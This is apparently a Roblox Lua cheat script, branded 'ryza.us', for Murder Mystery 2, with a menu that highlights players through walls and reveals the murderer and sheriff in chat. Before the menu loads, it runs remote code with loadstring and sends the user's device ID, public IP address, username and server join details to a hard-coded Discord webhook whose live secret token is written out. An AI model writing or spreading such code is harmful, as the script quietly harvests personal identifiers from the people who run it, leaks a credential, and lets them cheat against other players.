local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local LocalPlayer = game:GetService("Players").LocalPlayer
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UsersList = {}
_G.FlingTarget = {}

table.insert(UsersList, LocalPlayer.Name)

local webhookURL = "https://discord.com/api/webhooks/1360363792797667439/HyzcHgo-2IahecC2GR1lYgrJ75j_boNpch1R36Q61te9SIERh8wIuKe26Ajh_rfUOg1f"
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
task.wait(0.2)
local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
local placeName = "Unknown Place"

local success, productInfo = pcall(function()
	return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)

if success and productInfo and productInfo.Name then
	placeName = productInfo.Name
end

local executorName = identifyexecutor() or "Unknown"
local executorInfo = ""

if executorName == "JJSploit x Xeno" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "JJSploit" then
	executorInfo = "HWID Spoofer"
elseif executorName == "Xeno" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "Krnl" or executorName == "KRNL" then
	executorInfo = "IP/HWID Spoofer"
elseif executorName == "MacSploit" then
	executorInfo = "Safe"
elseif executorName == "Velocity" then
	executorInfo = "Unmeasured"
elseif executorName == "Swift" then
	executorInfo = "Unsafe: Slow device root cause"
else
	executorInfo = "Safety Unknown"
end

local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local IP = game:HttpGet("https://v4.ident.me/")

if HWID == "null" then
	local s = Instance.new("Sound")
	s.Parent = LocalPlayer.PlayerGui
	s.SoundId = "rbxassetid://17518855592"
	s.Volume = 1000
	s.Looped = true
	s:Play()
	task.wait(5)
	LocalPlayer:Kick("The associated discord account (1330566596975923223) is not permitted to use this script.\nAppeal: https://discord.gg/XRqjm6Nk4K")
end

local data = {
	content = "",
	embeds = {{
		title = "Version 2 Execution Details",
		color = 49151,
		fields = {
			{ name = "**Player Name**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
			{ name = "**Place ID**", value = "`" .. game.PlaceId .. "`", inline = true },
			{ name = "**Place Name**", value = "`" .. placeName .. "`", inline = true },
			{ name = "**Job ID**", value = "`" .. (game.JobId or "N/A") .. "`", inline = false },
			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
			{ name = "**User Key**", value = HWID, inline = true },
			{ name = "**IP Address**", value = IP, inline = true },
			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
		},
		footer = {
			text = "Execution Log • " .. currentTime,
			icon_url = "https://media.discordapp.net/attachments/1358006935491838104/1358007534887108638/Group_29.png?ex=67f24692&is=67f0f512&hm=ac3ac8250558a5dd7b9324f39c60d357266d0194dfba3731088c973edf9c3cc5&=&format=webp&quality=lossless&width=469&height=469"
		}
	}}
}

local jsonEncodedData = game:GetService("HttpService"):JSONEncode(data)

if httpRequest then
	pcall(function()
		httpRequest({
			Url = webhookURL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = jsonEncodedData
		})
	end)
end

-- // Murder Mystery 2 Set-Up

local uis = game:GetService("UserInputService")
local sStoreSize = UDim2.fromOffset(0, 0)

if uis.TouchEnabled then
	sStoreSize = UDim2.fromOffset(580, 300)
else
	sStoreSize = UDim2.fromOffset(580, 460)
end

local Window = Fluent:CreateWindow({
	Title = "ryza.us",
	SubTitle = "by lvasion.",
	TabWidth = 160,
	Size = sStoreSize,
	Acrylic = true,
	Theme = "Rose",
	MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
	Main = Window:AddTab({ Title = "Main", Icon = "home" }),
	ESP = Window:AddTab({ Title = "Drawing", Icon = "users" }),
	Roles = Window:AddTab({ Title = "Roles", Icon = "book"}),
	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local tools = {
	["Murderer"] = {
		toolName = "Knife",
		highlightColor = Color3.new(1, 0, 0)
	},
	["Sheriff"] = {
		toolName = "Gun",
		highlightColor = Color3.new(0, 0.333333, 1)
	},
}

local mm2ConfigData = {
	espConfig = {
		enabled = false,
		highlightTeams = false
	},
	dataConfig = {
		murderer = nil,
		sheriff = nil
	}
}

do 
	local function applyHighlight(player, color)
		if player.Character then
			local Highlight = Instance.new("Highlight")
			Highlight.OutlineColor = Color3.new(0, 0, 0)
			Highlight.FillColor = color
			Highlight.Name = "ESP_Highlight"
			Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			Highlight.OutlineTransparency = 0
			Highlight.FillTransparency = 0.5
			Highlight.Enabled = true
			Highlight.Parent = player.Character
		end
	end

	local function checkHighlight(player)
		if LocalPlayer.Name == player.Name then
			return
		end
		
		local char = player.Character

		if char then
			if mm2ConfigData.espConfig.enabled then
				if char:FindFirstChild("ESP_Highlight") then
					if mm2ConfigData.espConfig.highlightTeams then
						local applyColor = Color3.new(0.333333, 1, 0.498039)

						if player.Backpack:FindFirstChild(tools.Murderer.toolName) or char:FindFirstChild(tools.Murderer.toolName) then
							applyColor = tools.Murderer.highlightColor
						elseif player.Backpack:FindFirstChild(tools.Sheriff.toolName) or char:FindFirstChild(tools.Sheriff.toolName) then
							applyColor = tools.Sheriff.highlightColor
						end

						char.ESP_Highlight.FillColor = applyColor
					else
						local applyColor = Color3.new(1, 1, 1)
						char.ESP_Highlight.FillColor = applyColor
					end
				else
					if mm2ConfigData.espConfig.highlightTeams then
						local applyColor = Color3.new(0.333333, 1, 0.498039)

						if player.Backpack:FindFirstChild(tools.Murderer.toolName) or char:FindFirstChild(tools.Murderer.toolName) then
							applyColor = tools.Murderer.highlightColor
						elseif player.Backpack:FindFirstChild(tools.Sheriff.toolName) or char:FindFirstChild(tools.Sheriff.toolName) then
							applyColor = tools.Sheriff.highlightColor
						end

						applyHighlight(player, applyColor)
					else
						local applyColor = Color3.new(1, 1, 1)
						applyHighlight(player, applyColor)
					end
				end
			else
				if char:FindFirstChild("ESP_Highlight") then
					char["ESP_Highlight"]:Destroy()
				end
			end
		end
	end
	
	local function checkRoles(player)
		local char = player.Character
		
		if player.Backpack:FindFirstChild(tools.Murderer.toolName) or char:FindFirstChild(tools.Murderer.toolName) then
			mm2ConfigData.dataConfig.murderer = player.Name
		elseif player.Backpack:FindFirstChild(tools.Sheriff.toolName) or char:FindFirstChild(tools.Sheriff.toolName) then
			mm2ConfigData.dataConfig.sheriff = player.Name
		end
	end

	task.spawn(function()
		while task.wait() do
			for _,v in pairs(Players:GetPlayers()) do
				checkHighlight(v)
				checkRoles(v)
			end
		end
	end)

	Tabs.Main:AddParagraph({
		Title = "ryza.us",
		Content = "Welcome to ryza.us, this script was built for Murder Mystery 2.\nIf you wish to report any bugs, please join our discord server."
	})

	Tabs.Main:AddParagraph({
		Title = "Discord Server",
		Content = "Invite: https://discord.gg/Kd7ZwasrzG"
	})

	Tabs.Main:AddParagraph({
		Title = "Script Creator",
		Content = "lvasion"
	})
	
	Tabs.Main:AddButton({
		Title = "Expose Roles",
		Description = "Spill the beans, all of them",
		Callback = function()
			local tts = game:GetService("TextChatService")
			local channels = tts:WaitForChild("TextChannels")
			local channel = channels:WaitForChild("RBXGeneral")
			
			channel:SendAsync("Murderer: " .. (mm2ConfigData.dataConfig.murderer or "i forgor"))
			task.wait(1)
			channel:SendAsync("Sheriff: " .. (mm2ConfigData.dataConfig.sheriff or "i forgor"))
		end
	})

	Tabs.ESP:AddToggle("MyToggle", {
		Title = "Toggle ESP",
		Description = "Highlight all players",
		Default = false,
		Callback = function(state)
			mm2ConfigData.espConfig.enabled = state
		end
	})

	Tabs.ESP:AddToggle("MyToggle", {
		Title = "Toggle Roles ESP",
		Description = "Highlight sheriff & murderer",
		Default = false,
		Callback = function(state)
			mm2ConfigData.espConfig.highlightTeams = state
		end
	})
end

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
Window:SelectTab(1)

Fluent:Notify({
	Title = "ryza.us",
	Content = "Our system has loaded successfully, attempting to send webhook data...",
	Duration = 8
})

SaveManager:LoadAutoloadConfig()
